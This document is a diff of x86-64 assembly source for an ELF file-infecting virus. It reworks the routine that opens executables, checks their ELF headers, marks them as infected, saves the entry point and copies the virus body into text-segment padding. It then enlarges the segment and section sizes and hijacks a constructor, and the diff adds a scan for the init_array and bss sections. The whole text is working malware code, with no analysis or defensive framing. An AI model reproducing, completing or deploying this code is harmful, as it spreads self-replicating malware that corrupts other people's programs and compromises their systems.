@@ -18,8 +18,8 @@ _start:
     syscall
 
 ; [rsp]         fd
-; [rsp + 0x4]     buf_len
-; [rsp + 0x8]     buffer
+; [rsp + 0x4]   buf_len
+; [rsp + 0x8]   buffer
 ; [rsp + 0x10]  index
 readdir:
     push    rbp
@@ -91,8 +91,8 @@ end_readdir:
 infect:
     push    rbp
     mov     rbp, rsp
-    sub     rsp, 0x90
-    mov     [rsp + 4], rdi
+    sub     rsp, STACK_FRAME_SIZE + 0x10 ; Let's be cautious 
+    mov     [rsp + filename], rdi
 
     mov     esi, O_RDWR
     mov     eax, SYS_OPEN
@@ -100,14 +100,14 @@ infect:
     test    eax, eax
     js      quit_infect
 
-    mov     [rsp], eax
-    mov     edi, [rsp]
-    lea     rsi, [rsp + 0x14]
+    mov     [rsp + fd], eax
+    mov     edi, [rsp + fd]
+    lea     rsi, [rsp + e_hdr]
     mov     rdx, ELFHDR_SIZE
     mov     eax, SYS_READ
     syscall
 
-    lea     rbx, [rsp + 0x14]
+    lea     rbx, [rsp + e_hdr]
     lea     rax, [rbx + e_ident]
     cmp     [rax], DWORD ELF_MAGIC
     jne     close_quit_infect
@@ -130,34 +130,34 @@ infect:
     jne     close_quit_infect
 
 right_type_check:
-    mov     edi, [rsp]
+    mov     edi, [rsp + fd]
     xor     rsi, rsi
     mov     rdx, SEEK_END
-    mov     rax, SYS_LSEEK
+    mov     eax, SYS_LSEEK
     syscall
     add     rax, virus_len
-    mov     [rsp + 0xc], rax
+    mov     [rsp + file_size], rax
     mov     rsi, rax
     xor     rdi, rdi
     mov     rdx, PROT_READ | PROT_WRITE
     mov     r10, MAP_SHARED
-    mov     r8d, [rsp]
+    mov     r8d, [rsp + fd]
     xor     r9, r9
-    mov     rax, SYS_MMAP
+    mov     eax, SYS_MMAP
     syscall
     test    rax, rax
     je      close_quit_infect
-    mov     [rsp + 0x58], rax
-    mov     edi, [rsp]
+    mov     [rsp + map], rax
+    mov     edi, [rsp + fd]
     mov     eax, SYS_CLOSE
     syscall
 
-    mov     rax, [rsp + 0x58]
+    mov     rax, [rsp + map]
     mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; mark binary for infection
     mov     rdx, QWORD [rax + e_entry]
-    mov     [rsp + 0x70], rdx
+    mov     [rsp + old_entrypoint], rdx
 
-    mov     rax, [rsp + 0x58]
+    mov     rax, [rsp + map]
     mov     r8, rax
     add     r8, [rax + e_phoff]
     mov     r9w, [rax + e_phnum]
@@ -168,23 +168,53 @@ loop_phdrs:
     cmp     [r8 + p_flags], DWORD PF_R | PF_X
     jne     comp_data
 save_text_infos:
-    mov     [rsp + 0x60], r8
+    mov     [rsp + text_phdr], r8
     mov     rdx, QWORD [r8 + p_filesz]
-    mov     [rsp + 0x78], rdx
+    mov     [rsp + old_text_size], rdx
 comp_data:
     cmp     [r8 + p_flags], DWORD PF_R | PF_W
     jne     next_phdr
 save_data_infos:
-    mov     [rsp + 0x68], r8
+    mov     [rsp + data_phdr], r8
 next_phdr:
     inc     r10
     add     r8w, [rax + e_phentsize]
     cmp     r10, r9
     jl      loop_phdrs
 
+loop_sections:
+    mov     rax, [rsp + map]
+    mov     rbx, [rax + e_shoff]
+    add     rbx, rax
+    mov     rdx, [rsp + text_phdr]
+    mov     rdx, [rdx + p_offset]
+    add     rdx, QWORD [rsp + old_text_size]
+    xor     r8, r8
+
+test_last_text:
+    mov     r9, QWORD [rbx + sh_offset]
+    add     r9, QWORD [rbx + sh_size]
+    cmp     r9, rdx
+    jne     test_init_array
+    mov     QWORD [rsp + last_text_shdr], rbx
+test_init_array:
+    mov     r9d, [rbx + sh_type]
+    cmp     r9d, SHT_INIT_ARRAY
+    jne     test_bss
+    mov     QWORD [rsp + init_array_shdr], rbx
+test_bss:
+    cmp     r9d, SHT_NOBITS
+    jne     next_section
+    mov     QWORD [rsp + bss_shdr], rbx
+next_section:
+    inc     r8
+    add     bx, [rax + e_shentsize]
+    cmp     r8w, [rax + e_shnum]
+    jle     test_last_text
+
 check_text_padding:
-    mov     r8, [rsp + 0x60]
-    mov     r9, [rsp + 0x68]
+    mov     r8, [rsp + text_phdr]
+    mov     r9, [rsp + data_phdr]
     mov     rbx, [r8 + p_offset]
     add     rbx, [r8 + p_filesz]
     mov     rax, [r9 + p_offset]
@@ -193,42 +223,23 @@ check_text_padding:
     cmp     rax, virus_len
     jle     remap_and_infect_data
 
-    mov     rax, [rsp + 0x60]
-    mov     rdi, [rsp + 0x58]
+    mov     rax, [rsp + text_phdr]
+    mov     rdi, [rsp + map]
     add     rdi, [rax + p_offset]
     add     rdi, [rax + p_filesz]
-    mov     rcx, virus_lenq
     lea     rsi, [rel _start]
+    mov     rcx, virus_lenq
 copy_payload:
     lodsq
     stosq
     loop    copy_payload
 increase_text_size:
-    mov     rax, [rsp + 0x60]
+    mov     rax, [rsp + text_phdr]
     add     QWORD [rax + p_filesz], virus_len
     add     QWORD [rax + p_memsz], virus_len
-
-increase_last_text_section_size:
-    mov     rax, [rsp + 0x58]
-    mov     rbx, [rax + e_shoff]
-    add     rbx, rax
-    mov     rdx, [rsp + 0x60]
-    mov     rdx, [rdx + p_offset]
-    add     rdx, QWORD [rsp + 0x78]
-    xor     r8, r8
-loop_sections:
-    mov     r9, QWORD [rbx + sh_offset]
-    add     r9, QWORD [rbx + sh_size]
-    cmp     r9, rdx
-    jne     next_section
-    add     QWORD [rbx + sh_size], virus_len
+    mov     rax, [rsp + last_text_shdr]
+    add     QWORD [rax + sh_size], virus_len
     jmp     hijack_constructor
-next_section:
-    inc     r8
-    cmp     r8w, [rax + e_shnum]
-    add     bx, [rax + e_shentsize]
-    jle     loop_sections
-
 
 remap_and_infect_data:
     mov     edi, 1
@@ -241,18 +252,18 @@ hijack_constructor:
 
 
 munmap_quit_infect:
-    mov     rdi, [rsp + 0x58]
-    mov     rsi, [rsp + 0xc]
+    mov     rdi, [rsp + map]
+    mov     rsi, [rsp + file_size]
     mov     eax, SYS_MSYNC
     syscall
 
-    mov     rdi, [rsp + 0x58]
-    mov     rsi, [rsp + 0xc]
+    mov     rdi, [rsp + map]
+    mov     rsi, [rsp + file_size]
     mov     eax, SYS_MUNMAP
     syscall
 
 close_quit_infect:
-    mov     edi, [rsp]
+    mov     edi, [rsp + fd]
     mov     eax, SYS_CLOSE
     syscall
 quit_infect:
